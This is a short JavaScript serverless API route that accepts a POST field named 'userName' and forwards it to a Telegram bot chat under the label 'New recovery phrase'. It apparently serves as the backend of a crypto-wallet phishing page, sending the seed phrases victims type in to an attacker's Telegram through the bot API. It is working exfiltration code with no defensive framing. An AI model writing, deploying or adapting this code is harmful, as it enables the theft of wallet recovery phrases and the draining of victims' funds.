// api/sendToTelegram.js
export default async function handler(req, res) {
    if (req.method === 'POST') {
        const { userName } = req.body;

        const token = process.env.TELEGRAM_BOT_TOKEN; // Use environment variables for security
        const chatId = process.env.TELEGRAM_CHAT_ID;

        try {
            const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
            const response = await fetch(telegramUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: `New recovery phrase: ${userName}`,
                }),
            });

            if (!response.ok) throw new Error("Failed to send message to Telegram");

            res.status(200).json({ message: 'Message sent to Telegram successfully!' });
        } catch (error) {
            res.status(500).json({ error: 'Failed to send message to Telegram' });
        }
    } else {
        res.status(405).json({ error: 'Method not allowed' });
    }
}
